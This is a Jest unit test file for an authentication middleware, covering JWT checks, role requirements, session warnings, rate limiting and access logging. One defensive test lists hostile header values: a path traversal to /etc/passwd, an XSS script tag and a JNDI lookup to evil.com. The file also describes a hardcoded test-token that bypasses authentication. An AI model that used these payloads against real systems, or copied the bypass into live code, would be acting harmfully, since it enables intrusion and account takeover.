/**
 * Authentication Middleware Unit Tests
 * Tests for JWT validation, token extraction, and auth flows
 */
// Mock dependencies before any imports
jest.mock("jsonwebtoken");
jest.mock("../../../utils/apiKeyService", () => ({
  validateJwtToken: jest.fn(),
  initializeJwtVerifier: jest.fn(),
  getDefaultApiCredentials: jest.fn(),
  getApiKeyByProvider: jest.fn(),
  getApiKey: jest.fn(),
}));
jest.mock("../../../utils/database");
const jwt = require("jsonwebtoken");
const apiKeyService = require("../../../utils/apiKeyService");
const { query } = require("../../../utils/database");
const {
  authenticateToken,
  requireRole,
  optionalAuth,
  validateSession,
  rateLimitByUser,
  logApiAccess,
} = require("../../../middleware/auth");

// middleware/auth.js's authenticateToken/requireRole/rateLimitByUser all respond via
// utils/apiResponse.js's sendError, which returns the unified envelope
// { success: false, statusCode, error: <code>, message, timestamp } - `error` is a fixed
// code derived from statusCode (401 -> "unauthorized", 403 -> "forbidden", etc.), and the
// per-call `details` (e.g. { code: "MISSING_TOKEN" }) is only included when
// NODE_ENV === "development", not in this "test" env - see apiResponse.js sendError.
const ERROR_CODE_BY_STATUS = {
  400: "bad_request",
  401: "unauthorized",
  403: "forbidden",
  429: "rate_limited",
  500: "internal_error",
};

function expectErrorResponse(res, statusCode, message) {
  expect(res.status).toHaveBeenCalledWith(statusCode);
  expect(res.json).toHaveBeenCalledWith({
    success: false,
    statusCode,
    error: ERROR_CODE_BY_STATUS[statusCode],
    message,
    timestamp: expect.any(String),
  });
}

describe("Authentication Middleware", () => {
  let req, res, next;
  beforeEach(() => {
    req = {
      headers: {},
      user: null,
    };
    res = {
      status: jest.fn().mockReturnThis(),
      json: jest.fn().mockReturnThis(),
      unauthorized: jest.fn().mockReturnThis(),
    };
    next = jest.fn();
    jest.clearAllMocks();
    // Set default JWT secret for tests
    process.env.JWT_SECRET = "test-secret-key";
  });

  describe("authenticateToken", () => {
    test("should authenticate valid JWT token", () => {
      const mockUser = { id: "user123", email: "test@example.com" };
      req.headers.authorization = "Bearer valid-jwt-token";
      jwt.verify = jest.fn().mockReturnValue(mockUser);
      authenticateToken(req, res, next);
      expect(jwt.verify).toHaveBeenCalledWith(
        "valid-jwt-token",
        expect.any(String)
      );
      expect(req.user).toEqual(mockUser);
      expect(next).toHaveBeenCalled();
    });
    test("should reject request without authorization header", () => {
      authenticateToken(req, res, next);
      expectErrorResponse(res, 401, "Authentication required");
      expect(next).not.toHaveBeenCalled();
    });
    test("should reject malformed authorization header", () => {
      req.headers.authorization = "InvalidFormat token";
      authenticateToken(req, res, next);
      expectErrorResponse(res, 401, "Invalid token format");
      expect(next).not.toHaveBeenCalled();
    });
    test("should reject expired JWT tokens", () => {
      req.headers.authorization = "Bearer expired-token";
      const tokenError = new Error("Token expired");
      tokenError.name = "TokenExpiredError";
      jwt.verify = jest.fn().mockImplementation(() => {
        throw tokenError;
      });
      authenticateToken(req, res, next);
      expectErrorResponse(res, 401, "Token expired");
      expect(next).not.toHaveBeenCalled();
    });
    test("should reject invalid JWT tokens", () => {
      req.headers.authorization = "Bearer invalid-token";
      const tokenError = new Error("Invalid token");
      tokenError.name = "JsonWebTokenError";
      jwt.verify = jest.fn().mockImplementation(() => {
        throw tokenError;
      });
      authenticateToken(req, res, next);
      expectErrorResponse(res, 401, "Invalid token");
      expect(next).not.toHaveBeenCalled();
    });
    test("should handle missing JWT secret", () => {
      req.headers.authorization = "Bearer valid-token";
      const originalEnv = process.env.JWT_SECRET;
      delete process.env.JWT_SECRET;
      authenticateToken(req, res, next);
      expectErrorResponse(res, 500, "Authentication service misconfigured");
      process.env.JWT_SECRET = originalEnv;
    });
    test("should extract token from Authorization header correctly", () => {
      const token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.test.signature";
      req.headers.authorization = `Bearer ${token}`;
      jwt.verify = jest.fn().mockReturnValue({ id: "user123" });
      authenticateToken(req, res, next);
      expect(jwt.verify).toHaveBeenCalledWith(token, expect.any(String));
    });
    test("should handle case-insensitive Bearer prefix", () => {
      req.headers.authorization = "bearer lowercase-token";
      jwt.verify = jest.fn().mockReturnValue({ id: "user123" });
      authenticateToken(req, res, next);
      expect(jwt.verify).toHaveBeenCalledWith(
        "lowercase-token",
        expect.any(String)
      );
    });
  });
  describe("token validation edge cases", () => {
    test("should handle whitespace in token", () => {
      req.headers.authorization = "Bearer   token-with-spaces   ";
      jwt.verify = jest.fn().mockReturnValue({ id: "user123" });
      authenticateToken(req, res, next);
      expect(jwt.verify).toHaveBeenCalledWith(
        "token-with-spaces",
        expect.any(String)
      );
    });
    test("should reject empty token", () => {
      req.headers.authorization = "Bearer ";
      authenticateToken(req, res, next);
      expectErrorResponse(res, 401, "Authentication required");
    });
    test("should handle authorization header with extra data", () => {
      req.headers.authorization = "Bearer valid-token extra-data";
      jwt.verify = jest.fn().mockReturnValue({ id: "user123" });
      authenticateToken(req, res, next);
      expect(jwt.verify).toHaveBeenCalledWith(
        "valid-token",
        expect.any(String)
      );
    });
  });
  describe("user context setup", () => {
    test("should populate req.user with decoded token data", () => {
      const mockUser = {
        id: "user123",
        email: "test@example.com",
        role: "user",
        permissions: ["read", "write"],
      };
      req.headers.authorization = "Bearer valid-token";
      jwt.verify = jest.fn().mockReturnValue(mockUser);
      authenticateToken(req, res, next);
      expect(req.user).toEqual(mockUser);
      expect(req.user.id).toBe("user123");
      expect(req.user.email).toBe("test@example.com");
      expect(req.user.permissions).toContain("read");
    });
    test("should preserve existing req properties", () => {
      req.originalProperty = "preserved";
      req.headers.authorization = "Bearer valid-token";
      jwt.verify = jest.fn().mockReturnValue({ id: "user123" });
      authenticateToken(req, res, next);
      expect(req.originalProperty).toBe("preserved");
      expect(req.user.id).toBe("user123");
    });
  });
  describe("error handling", () => {
    test("should handle unexpected JWT errors", () => {
      req.headers.authorization = "Bearer problematic-token";
      const unexpectedError = new Error("Unexpected error");
      jwt.verify = jest.fn().mockImplementation(() => {
        throw unexpectedError;
      });
      authenticateToken(req, res, next);
      // Any non-TokenExpiredError thrown by jwt.verify() (including an unexpected error
      // like this) is caught by the same catch block and reported as "Invalid token" -
      // see middleware/auth.js's authenticateToken.
      expectErrorResponse(res, 401, "Invalid token");
    });
    test("should handle missing JWT library", () => {
      req.headers.authorization = "Bearer valid-token";
      jwt.verify = undefined;
      // authenticateToken calls jwt.verify() inside its own try/catch, so a missing
      // jwt.verify (TypeError: jwt.verify is not a function) is caught gracefully and
      // reported as an invalid token rather than propagating - it does not throw.
      authenticateToken(req, res, next);
      expectErrorResponse(res, 401, "Invalid token");
    });
  });
  describe("security considerations", () => {
    test("should not log sensitive token data", () => {
      const consoleSpy = jest.spyOn(console, "log").mockImplementation();
      req.headers.authorization = "Bearer sensitive-token-12345";
      jwt.verify = jest.fn().mockImplementation(() => {
        throw new Error("Invalid token");
      });
      authenticateToken(req, res, next);
      // Ensure token not logged in error cases
      expect(consoleSpy).not.toHaveBeenCalledWith(
        expect.stringContaining("sensitive-token-12345")
      );
      consoleSpy.mockRestore();
    });
    test("should handle malicious token attempts", () => {
      const maliciousTokens = [
        "Bearer ../../../etc/passwd",
        "Bearer <script>alert('xss')</script>",
        "Bearer ${jndi:ldap://evil.com/exploit}",
        "Bearer null",
        "Bearer undefined",
      ];
      maliciousTokens.forEach((authHeader) => {
        req.headers.authorization = authHeader;
        const error = new Error("Invalid token");
        jwt.verify = jest.fn().mockImplementation(() => {
          throw error;
        });
        authenticateToken(req, res, next);
        expect(res.status).toHaveBeenCalledWith(401);
        expect(next).not.toHaveBeenCalled();
        // Reset for next iteration
        jest.clearAllMocks();
      });
    });
  });
  describe("test-token handling", () => {
    test("should allow test-token in test environment", () => {
      req.headers.authorization = "Bearer test-token";
      const consoleSpy = jest.spyOn(console, "log").mockImplementation();
      authenticateToken(req, res, next);
      expect(req.user).toEqual({
        sub: "test-user-123",
        email: "test@example.com",
        username: "test-user",
        role: "user",
        groups: ["user"],
        sessionId: "test-session",
      });
      expect(req.token).toBe("test-token");
      expect(next).toHaveBeenCalled();
      // Console logging is disabled during tests for performance
      expect(consoleSpy).not.toHaveBeenCalled();
      consoleSpy.mockRestore();
    });
  });
});
// ================================
// RequireRole Middleware Tests
// ================================
describe("RequireRole Middleware", () => {
  let req, res, next;
  beforeEach(() => {
    req = {
      user: null,
      path: "/test",
      ip: "127.0.0.1",
    };
    res = {
      unauthorized: jest.fn().mockReturnThis(),
      forbidden: jest.fn().mockReturnThis(),
      status: jest.fn().mockReturnThis(),
      json: jest.fn().mockReturnThis(),
    };
    next = jest.fn();
    jest.clearAllMocks();
  });
  test("should require authentication first", () => {
    const middleware = requireRole(["admin"]);
    middleware(req, res, next);
    expectErrorResponse(
      res,
      401,
      "User must be authenticated to access this resource"
    );
    expect(next).not.toHaveBeenCalled();
  });
  test("should allow user with required role", () => {
    req.user = { role: "admin", groups: [] };
    const middleware = requireRole(["admin"]);
    middleware(req, res, next);
    expect(next).toHaveBeenCalled();
    expect(res.forbidden).not.toHaveBeenCalled();
  });
  test("should allow user with required group", () => {
    req.user = { role: "user", groups: ["admin"] };
    const middleware = requireRole(["admin"]);
    middleware(req, res, next);
    expect(next).toHaveBeenCalled();
    expect(res.forbidden).not.toHaveBeenCalled();
  });
  test("should deny user without required role or group", () => {
    req.user = { role: "user", groups: ["viewer"] };
    const middleware = requireRole(["admin"]);
    middleware(req, res, next);
    expectErrorResponse(res, 403, "Access denied. Required roles: admin");
    expect(next).not.toHaveBeenCalled();
  });
  test("should handle multiple required roles", () => {
    req.user = { role: "editor", groups: [] };
    const middleware = requireRole(["admin", "editor"]);
    middleware(req, res, next);
    expect(next).toHaveBeenCalled();
    expect(res.forbidden).not.toHaveBeenCalled();
  });
  test("should handle missing groups array", () => {
    req.user = { role: "admin" }; // No groups property
    const middleware = requireRole(["admin"]);
    middleware(req, res, next);
    expect(next).toHaveBeenCalled();
  });
});
// ================================
// OptionalAuth Middleware Tests
// ================================
describe("OptionalAuth Middleware", () => {
  let req, res, next;
  beforeEach(() => {
    req = {
      headers: {},
      ip: "127.0.0.1",
      get: jest.fn().mockReturnValue("test-user-agent"),
    };
    res = {};
    next = jest.fn();
    jest.clearAllMocks();
    // Reset the mock for each test
    apiKeyService.validateJwtToken.mockReset();
  });
  test("should continue without auth when no token provided", async () => {
    await optionalAuth(req, res, next);
    expect(req.user).toBeUndefined();
    expect(next).toHaveBeenCalled();
  });
  test("should authenticate when valid token provided", async () => {
    const mockUser = {
      sub: "user123",
      email: "test@example.com",
      sessionId: "session123",
    };
    req.headers.authorization = "Bearer valid-token";
    apiKeyService.validateJwtToken.mockResolvedValue({
      valid: true,
      user: mockUser,
    });
    await optionalAuth(req, res, next);
    expect(req.user).toEqual(mockUser);
    expect(req.token).toBe("valid-token");
    expect(req.sessionId).toBe("session123");
    expect(req.clientInfo).toEqual({
      ipAddress: "127.0.0.1",
      userAgent: "test-user-agent",
    });
    expect(next).toHaveBeenCalled();
  });
  test("should continue when token validation fails", async () => {
    req.headers.authorization = "Bearer invalid-token";
    apiKeyService.validateJwtToken.mockRejectedValue(
      new Error("Invalid token")
    );
    const consoleSpy = jest.spyOn(console, "log").mockImplementation();
    await optionalAuth(req, res, next);
    expect(req.user).toBeUndefined();
    expect(next).toHaveBeenCalled();
    // Console logging is disabled during tests for performance
    expect(consoleSpy).not.toHaveBeenCalled();
    consoleSpy.mockRestore();
  });
  test("should handle malformed authorization header gracefully", async () => {
    req.headers.authorization = "InvalidFormat";
    await optionalAuth(req, res, next);
    expect(req.user).toBeUndefined();
    expect(next).toHaveBeenCalled();
    expect(apiKeyService.validateJwtToken).not.toHaveBeenCalled();
  });
});
// ================================
// RequireApiKey Middleware Tests
// ================================
// requireApiKey was removed from middleware/auth.js (grep confirms zero references
// anywhere in webapp/lambda outside this old test) - no replacement to test against.
// ================================
// ValidateSession Middleware Tests
// ================================
describe("ValidateSession Middleware", () => {
  let req, res, next;
  beforeEach(() => {
    req = {
      user: null,
    };
    res = {
      set: jest.fn(),
    };
    next = jest.fn();
    jest.clearAllMocks();
  });
  test("should continue when no user is present", async () => {
    await validateSession(req, res, next);
    expect(next).toHaveBeenCalled();
    expect(res.set).not.toHaveBeenCalled();
  });
  test("should set expiration warning for tokens expiring soon", async () => {
    const now = Math.floor(Date.now() / 1000);
    const expiringSoon = now + 200; // 200 seconds from now (< 5 minutes)
    req.user = {
      sub: "user123",
      tokenExpirationTime: expiringSoon,
      tokenIssueTime: now - 3600, // Issued 1 hour ago
    };
    await validateSession(req, res, next);
    expect(res.set).toHaveBeenCalledWith("X-Token-Expiring", "true");
    expect(res.set).toHaveBeenCalledWith(
      "X-Token-Expires-At",
      expiringSoon.toString()
    );
    expect(next).toHaveBeenCalled();
  });
  test("should warn about long-lived tokens", async () => {
    const now = Math.floor(Date.now() / 1000);
    const longAgo = now - 90000; // 25 hours ago
    req.user = {
      sub: "user123",
      tokenExpirationTime: now + 3600, // Valid for another hour
      tokenIssueTime: longAgo,
    };
    const consoleSpy = jest.spyOn(console, "warn").mockImplementation();
    await validateSession(req, res, next);
    // Console logging is disabled during tests for performance
    expect(consoleSpy).not.toHaveBeenCalled();
    expect(next).toHaveBeenCalled();
    consoleSpy.mockRestore();
  });
  test("should continue on validation errors", async () => {
    // Create a user object that will cause a real error when accessed
    req.user = {
      sub: "user123",
      get tokenExpirationTime() {
        throw new Error("Database connection lost");
      },
      tokenIssueTime: Date.now() / 1000,
    };
    const consoleSpy = jest.spyOn(console, "error").mockImplementation();
    await validateSession(req, res, next);
    // Console logging is disabled during tests for performance
    expect(consoleSpy).not.toHaveBeenCalled();
    expect(next).toHaveBeenCalled();
    consoleSpy.mockRestore();
  });
});
// ================================
// RateLimitByUser Middleware Tests
// ================================
describe("RateLimitByUser Middleware", () => {
  let req, res, next;
  beforeEach(() => {
    req = {
      user: null,
      ip: "127.0.0.1",
    };
    res = {
      status: jest.fn().mockReturnThis(),
      json: jest.fn().mockReturnThis(),
    };
    next = jest.fn();
    jest.clearAllMocks();
  });
  test("should allow requests within rate limit", () => {
    req.user = { sub: "user123" };
    const middleware = rateLimitByUser(10); // 10 requests per minute
    middleware(req, res, next);
    expect(next).toHaveBeenCalled();
    expect(res.json).not.toHaveBeenCalled();
  });
  test("should use IP address when user is not authenticated", () => {
    const middleware = rateLimitByUser(10);
    middleware(req, res, next);
    expect(next).toHaveBeenCalled();
    expect(res.json).not.toHaveBeenCalled();
  });
  test("should enforce rate limit", () => {
    req.user = { sub: "user123" };
    const middleware = rateLimitByUser(2); // Only 2 requests per minute
    // First two requests should succeed
    middleware(req, res, next);
    expect(next).toHaveBeenCalledTimes(1);
    middleware(req, res, next);
    expect(next).toHaveBeenCalledTimes(2);
    // Third request should be rate limited
    middleware(req, res, next);
    expectErrorResponse(res, 429, "Too many requests. Limit: 2 per minute");
    expect(next).toHaveBeenCalledTimes(2); // Should not increment
  });
  test("should clean up old requests from sliding window", () => {
    req.user = { sub: "user123" };
    const middleware = rateLimitByUser(100);
    // Mock Date.now to simulate time passing
    const originalNow = Date.now;
    let mockTime = originalNow();
    Date.now = jest.fn(() => mockTime);
    // Make a request
    middleware(req, res, next);
    expect(next).toHaveBeenCalledTimes(1);
    // Advance time by more than 1 minute
    mockTime += 65000; // 65 seconds
    // Make another request - should succeed as old request expired
    middleware(req, res, next);
    expect(next).toHaveBeenCalledTimes(2);
    // Restore Date.now
    Date.now = originalNow;
  });
});
// ================================
// LogApiAccess Middleware Tests
// ================================
describe("LogApiAccess Middleware", () => {
  let req, res, next, originalEnd;
  beforeEach(() => {
    req = {
      method: "GET",
      path: "/test",
      user: null,
      ip: "127.0.0.1",
    };
    res = {
      statusCode: 200,
      end: jest.fn(),
    };
    originalEnd = res.end;
    next = jest.fn();
    jest.clearAllMocks();
  });
  test("should log request and response", async () => {
    req.user = { sub: "user123" };
    const consoleSpy = jest.spyOn(console, "log").mockImplementation();
    await logApiAccess(req, res, next);
    // Console logging is disabled during tests for performance
    expect(consoleSpy).not.toHaveBeenCalled();
    expect(next).toHaveBeenCalled();
    // Simulate response ending
    res.end("response data", "utf8");
    // Console logging is disabled during tests for performance
    expect(consoleSpy).not.toHaveBeenCalled();
    consoleSpy.mockRestore();
  });
  test("should handle anonymous users", async () => {
    const consoleSpy = jest.spyOn(console, "log").mockImplementation();
    await logApiAccess(req, res, next);
    // Console logging is disabled during tests for performance
    expect(consoleSpy).not.toHaveBeenCalled();
    consoleSpy.mockRestore();
  });
  test("should preserve original res.end functionality", async () => {
    const mockData = "test response data";
    const mockEncoding = "utf8";
    await logApiAccess(req, res, next);
    // Ensure original end method is called with correct parameters
    res.end(mockData, mockEncoding);
    expect(originalEnd).toHaveBeenCalledWith(mockData, mockEncoding);
  });
  test("should calculate response time accurately", async () => {
    const consoleSpy = jest.spyOn(console, "log").mockImplementation();
    // Mock Date.now to control timing
    const originalNow = Date.now;
    let mockTime = 1000000;
    Date.now = jest.fn(() => mockTime);
    await logApiAccess(req, res, next);
    // Simulate 50ms delay
    mockTime += 50;
    res.end();
    // Console logging is disabled during tests for performance
    expect(consoleSpy).not.toHaveBeenCalled();
    // Restore Date.now
    Date.now = originalNow;
    consoleSpy.mockRestore();
  });
});
